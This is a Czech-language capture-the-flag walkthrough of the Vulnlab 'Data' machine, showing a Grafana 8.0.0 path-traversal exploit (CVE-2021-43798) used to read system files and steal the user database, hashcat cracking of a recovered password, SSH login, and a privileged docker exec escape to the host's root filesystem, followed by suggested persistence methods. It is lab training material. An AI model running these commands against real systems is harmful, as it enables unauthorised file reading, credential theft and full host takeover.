+++
title = "Vulnlab - Data (Easy)"
author = ""
authorTwitter = "" #do not include @
cover = ""
tags = ["Vulnlab", "Pentesting", "Linux"]
keywords = ["", ""]
description = "Další skvělá mašina z platformy **Vulnlab**. Tentokrát s operačním systémem **Linux**. Přečtěte si něco o tom, jak lze využít známých **CVE** pro exploitaci systému a jak mohou docker containery vést k eskalaci práv na hostitelském systému."
showFullContent = false
readingTime = false
hideComments = false
+++

## Informace o stroji

- **Název:** Data
- **Platforma:** Vulnlab
- **Úroveň obtížnosti:** Easy
- **OS:** Linux
- **IP/Hostname:** data.vl (10.10.x.x)
- **Popis:** Na této mašině se naučíte vyhledávat a využívat **CVE**, **crackovat hesla** a eskalaci práv pomocí **docker containeru**

---

## Rustscan - otevřené porty a identifikace služeb

```bash
rustscan -a data.vl -- -A
```

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 43:2d:05:6e:99:56:48:72:aa:53:1b:f3:0e:52:3b:f6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCg55HBFLMFk78s5qJIPGNbnjT/Z2sHFLqZm7XYXXAWx8UsINIQ1uU/pwjCP8zUY4B9ItyzDGKIklgLWKT5GOEsCu8LSwU+8CFpL3opwIOZgkpxDkEgCvCTT3jY9a+cek1XnH/TZtORL3zVEMM0B4qaENn0BwB7++oYbysW1R8m3aC8EuvAjyS+pcB0NLx7pUawSn9lgfQ/jsgVHH1M/dDFfoBQ7DPbBX+B4W0WKPgwxJkzjEwqt8A1Y3uwBvGFGK0h7THZFIU5YQBos4GJ+fJnuil0z5vLtyRQ74sWGBQfHUvK0cPlKvprZHnUwYgkmjKngpN76Crnlxwj4KhWG9NH
|   256 b6:b5:15:fe:cc:3e:51:21:2c:b2:8d:61:0c:6c:a6:d5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJkf6PxhnhTUW5jvdvqE0QLcOzkcPJBE5CzInw1VDmZH8WyHows5EenAeEA68MwvJ+1bAFlJ+W0NMNMVSzhcVWk=
|   256 bb:23:19:7d:c3:df:9d:b4:af:a8:ac:00:32:19:3f:15 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINgLdzKSLpi4X4JWZSeecq3N2NTQ34gtwriGhzj7NCFK
3000/tcp open  ppp?    syn-ack ttl 62
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Wed, 29 Jan 2025 23:05:05 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Wed, 29 Jan 2025 23:04:34 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Wed, 29 Jan 2025 23:04:39 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=1/29%Time=679AB401%P=x86_64-pc-linux-gnu%r
```

Ze scanu se dozvídáme hned několik užitečných věcí. První věc je ta, že jsou na systému otevřené 2 porty, a to **22 (SSH)** a **3000 (Web)**. Získáváme taky informace o verzi SSH, což by se mohlo hodit. Další velmi užitečná infromace je taková, že hodnota TTL se u obou těchto služeb liší. Port **22** má TTL hodnotu **63**, zatímco port **3000** pouze **62**. 

Dobře, co to tedy znamená? V prvé řadě z tohoto lze usoudit, že máme tu čest s Linuxovým systémem. Defaultní TTL hodnota pro Linux je totiž **64**, zatímco pro Windows je to **128**. Že se jedná o Linux nám prozrazuje také služba **SSH**, u níž můžeme spatřit ve verzi název `Ubuntu`. Ale jak si tedy vysvětlíme rozdílné TTL hodnoty u obou služeb? Odpověď je jednoduchá, služba na portu **3000** nejspíš běží uvnitř docker containeru, což pro nás může být později užitečná informace. 


---

## Port 3000
Po návštěve `http://data.vl:3000` ve webovém prohlížeči uvidíme, že se jedná o Grafanu. To je webová aplikace, která umožňuje vizualizaci dat z nejrůznějších zdrojů (např. JSON, CSV, XML, ...). V dolní části stránky lze zpozorovat verzi `8.0.0`.

![Grafana version](/img/version.png)

Pokud vyhledáme verzi na Google, zjistíme, že tato verze obsahuje zranitelnost **Path Traversal** a CVE této zranitelnosti je **CVE-2021-43798**. Projevuje se tak, že při HTTP požadavku např. na `http://data.vl:3000/public/plugins/mysql/` lze na konec URL přidat path traversal k nějakému souboru na systému, jehož obsah nám stránka pošle jako součást odpovědi, můžeme zkusit třeba soubor `/etc/passwd` pro důkaz, že zranitelnost funguje. Výsledný škodlivý dotaz by pak mohl vypadat takto:

```bash
curl http://data.vl:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
```

---

## Exploitace

Skutečně je aplikace zranitelná a byli jsme schopni přečíst soubor na lokálním systému, ale kam dál? Teď když jsme zjistili, že je možné číst systémové soubory, se pojďme zaměřit na ty citlivé, které by nám mohly něco prozradit. Pokud se řekne citlivý soubor v kontextu Grafany, napadají mě například konfigurační nebo databázové soubory. Podle Google je právě jeden takový soubor uložený ve `/var/lib/grafana/grafana.db`, pojďme si jej tedy stáhnout k sobě na Kali.

```bash
curl http://data.vl:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flib%2Fgrafana%2Fgrafana.db --output grafana.db
```

Tímto získáme na Kali soubor s názvem `grafana.db`, který obsahuje databázi grafany. S databází můžeme interaktovat pomocí nástroje `sqlite`.

```bash
sqlite3 grafana.db

```

Nyní potřebujeme databázi prozkoumat. Chceme vědět, jak vypadá schéma databáze, jaké jsou zde tabulky, sloupce v tabulkách, apod. To lze jednoduše provést následujícími příkazy:

```sql
# Zobrazení schéma
sqlite> select sql from sqlite_schema;
# Výpis tabulek
sqlite> select tbl_name from sqlite_master where type='table';
```

Pokud si necháme vypsat tabulky, všimneme si, že je zde tabulka `user`, která rozhodně působí zajímavě. Ze schéma databáze víme, že tabulka obsahuje citlivé sloupce jako je `login`, `email`, `password` a `salt`. Nechme si tyto údaje z tabulky vypsat následovně:

```sql
sqlite> select login,email,password,salt from user;
```

```
admin|admin@localhost|7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S
boris|boris@data.vl|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl
```

Získali jsme údaje uživatelů **admin** a **boris**, teď se jako možnost jeví **crackování** těchto hesel, ale abychom to mohli udělat, potřebujeme zjistit, v jakém formátu tyto hashe jsou a jak s nimi Grafana pracuje, protože pokud tento hash zkusíme předat nástroji pro identifikaci hashe, nerozpozná jej.

Po chvíli Googlení se můžeme dočíst, že Grafana používá **PBKDF2** pro hashování, ale my potřebujeme tento `hash` spolu s jeho `salt` hodnotou nějakým způsobem "spojit" a z toho vytvořit hash ve formátu, který hashcat rozpozná. Takový formát je například `PBKDF2-HMAC-SHA256` a když si tento formát najdeme na internetu ve spojitosti s grafanou, narazíme na github repozitář s názvem **Grafana2Hashcat**, což zní jako něco, co hledáme. [Grafana2Hashcat](https://github.com/iamaldi/grafana2hashcat).

Jde o python skript, který převede hash a jeho salt na formát, kterému hashcat rozumí. Musíme vytvořit soubor, například **grafana_hashes.txt**, který bude obsahovat na každém řádku hodnotu `hash,salt` z databáze. Tento soubor potom přidáme skriptu jako parametr.

```
# grafana_hashes.txt
7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8,YObSoLj55S
dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8,LCBhdtJWjl
```

Spustíme skript takto:

```bash
python3 grafana2hashcat.py grafana_hashes.txt
```

```
[+] Grafana2Hashcat
[+] Reading Grafana hashes from:  grafana_hashes.txt
[+] Done! Read 2 hashes in total.
[+] Converting hashes...
[+] Converting hashes complete.
[*] Outfile was not declared, printing output to stdout instead.

sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=

[+] Now, you can run Hashcat with the following command, for example:

hashcat -m 10900 hashcat_hashes.txt --wordlist wordlist.txt
```

Výborně, tyto nové hashe si uložíme do samostatného souboru **hashcat_hash.txt** a předáme jej hashcatu. Skript nám dokonce krásně ukazuje, jak bude hashcat příkaz vypadat, akorát s rozdílem, že parametru `--wordlist` přidělíme vlastní cestu k souboru **rockyou.txt**, což je wordlist, který obsahuje obrovské množství hesel.

```bash
sudo hashcat -m 10900 hashcat_hash --wordlist /usr/share/wordlists/rockyou.txt
```

Po chvíli čekání nám hashcat zobrazí clear-text heslo jednoho z hashů.

```
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1
```

Jde o heslo uživatele **boris**, druhé heslo uživatele **admin** se nepodařilo cracknout. Zkusme teď tedy popřemýšlet, kde bychom tyto údaje mohli využít. Jedna z možností je Grafana login panel a ano, údaje zde fungují, ale vraťme se ještě zpět na začátek a uvědomme si, že je na systému také aktivní služba **SSH**, zkusme se k ní tedy přihlásit.

```bash
ssh boris@data.vl
boris@data.vl's password: 
```

```
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1060-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jan 30 00:26:51 UTC 2025

  System load:  0.0               Processes:              99
  Usage of /:   19.9% of 7.69GB   Users logged in:        0
  Memory usage: 25%               IP address for eth0:    10.10.104.66
  Swap usage:   0%                IP address for docker0: 172.17.0.1


0 updates can be applied immediately.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jan 30 00:15:59 2025 from 10.8.5.82
boris@ip-10-10-10-11:~$ 

```

Úspěšně jsme se přihlásili k hostitelskému systému. Už z přihlašovacího banneru můžeme vyčíst, že jsou na systému nejspíš přítomny docker containery, což je určitě dobrá informace.

---

## Eskalace privilegií

Po přihlášení k **SSH** musíme začít prozkoumávat systém a pokusit se najít cestu k uživateli **root**. Při prozkoumávání můžeme začít nejprve jednoduchými věcmi, jako třeba podívat se do různých adresářů, zkusit vypsat historii příkazů našeho uživatele, zjistit, jací další uživatelé se na systému nacházejí, apod. Když známe heslo našeho uživatele, můžeme taky vypsat příkazy, které můžeme na systému spouštět jako `sudo`. Právě to by mohlo vést k eskalaci práv. To provedeme takto:

```bash
sudo -l
```

```
User boris may run the following commands on ip-10-10-10-11:
    (root) NOPASSWD: /snap/bin/docker exec *
```

Zajímavé, na systému můžeme spouštět příkaz `docker exec` jako uživatel root. No jo, ale nejprve potřebujeme zjistit, jaké kontejnery běží na systému. Pokud se vrátíme k našim dřívějším poznámkám, vzpomeneme si, že Grafana měla jinou hodnotu TTL při scanování než služba SSH. To indikuje, že práve Grafana běží v kontejneru, můžeme tedy začít tady. Jak ale zjistíme název nebo id kontejneru? Můžeme prostě vyzkoušet název kontejneru `grafana`, protože to dává smysl a nebo můžeme využít elegantnější řešení a vrátit se zpět k **Path Traversal** zranitelnosti a zkusíme přečíst soubor **/etc/hostname**, kde získáme ID kontejenru. Název kontejneru `grafana` ale funguje stejně dobře, proto budu ke kontejneru přistupovat právě pomocí tohoto názvu.

Podívejme se dovnitř kontejneru pomocí příkazu:

```bash
sudo docker exec -it grafana sh
```

To funguje, dostaneme se dovnitř kontejneru, ale nemáme v něm práva **root**. Pokud si přečteme oficiální dokumentaci `docker exec`, zjistíme, že je možné přidat parametr `-u [uživatel]`, což udělá to, že spouštíme příkazy uvnitř kontejenru jako daný uživatel. Dalším zajímavým parametrem, je parametr `--privileged`, který v podstatě umožní, že nebudeme izolování od hostitelského systému.

```bash
sudo docker exec -it --privileged -u root grafana sh
```

Jsme uvnitř kontejneru jako uživatel **root** a kontejner běží v privilegovaném režimu. Odtud je možné získat kontrolu nad hostitelským systémem hned několika způsoby. Já ukážu jeden, který jsem použil já a poté ukážu také odkaz na článek, který popisuje, jak by to šlo udělat jinak. Testoval jsem obě varianty a obě fungovaly.

Moje varianta, kterou jsem použil, spočívala v tom, že bylo možné namountovat hostitelský diskový oddíl dovnitř kontejneru. pokud na hostitelském systému zadáme příkaz pro vypsání namountovaných disků, uvidíme, že disk `/dev/xvda1` je namountován na kořenový adresář.

```bash
mount | grep ext4
```

```
/dev/xvda1 on / type ext4 (rw,relatime,discard)
```

Pokud se vrátíme do kontejneru stejným příkazem, jako jsme použili výše a vypíšeme adresář /dev, uvidíme, že se zde nachází oddíl `/dev/xvda1` a protože jsme v privilegovaném kontejneru **root**, můžeme ho namountovat například na adresář `/mnt` uvnitř kontejenru.

```bash
/usr/share/grafana # ls -l /dev
```

```
brw-rw----    1 root     disk      202,   0 Jan 30 21:06 xvda
brw-rw----    1 root     disk      202,   1 Jan 30 21:06 xvda1
```

Namountování uvnitř kontejenru:

```bash
mount /dev/xvda1 /mnt
cd /mnt
ls
```

```
bin             lib             root            usr
boot            lib64           run             var
dev             lost+found      sbin            vmlinuz
etc             media           snap            vmlinuz.old
home            mnt             srv
initrd.img      opt             sys
initrd.img.old  proc            tmp
```

Nyní máme neomezený přístup k hostitelskému systému. Můžeme vypsat **flag** uvnitř `/root` adresáře jako důkaz.

```bash
/mnt/root# cat root.txt
```

```
VL{37c930a3b8b53...}
```

Tímto jsme dokázali, že máme neomezená práva, protože můžeme číst z adresáře /root na hostiteli. Tímto pro nás `CTF` končí, ale pokud bychom dělali Red Teaming nebo Pentest, mohli bychom si například zajistit persistenci na systému tím, že bychom vepsali svůj vlastní veřejný SSH klíč do souboru `/root/.ssh/authorized_keys` a tím bychom měli přístup k uživateli root přes **SSH** (Pokud není root login zakázán.). Mohli bychom vytvořit nového uživatele a přidat ho do skupiny **sudo**. Dal by se také vytvořit backdoor, který by byl pravidelně spouštěn při restartu systému, přihlášení uživatele nebo periodicky po nějakém čase. Možností je spousta, jediný možný limit je jen vaše kreativita.

Druhý postup, jak lze eskalovat práva na hostiteli přes kontejner naleznete zde: [Container running in privileged mode](https://learn.snyk.io/lesson/container-runs-in-privileged-mode/).

Budu se těšit u další mašiny :)
